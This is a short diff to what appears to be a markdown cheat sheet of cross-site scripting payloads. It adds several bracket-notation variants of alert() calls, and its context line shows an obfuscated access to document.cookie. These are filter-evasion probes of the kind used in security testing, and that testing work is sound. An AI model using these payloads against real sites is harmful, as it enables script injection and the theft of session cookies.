@@ -32,5 +32,11 @@ window["doc"+"ument"]["cookie"]
 ### Alert
 ```
 alert(1)
-
+window['alert'](0)
+parent['alert'](1)
+self['alert'](2)
+top['alert'](3)
+this['alert'](4)
+frames['alert'](5)
+content['alert'](6)
 ```
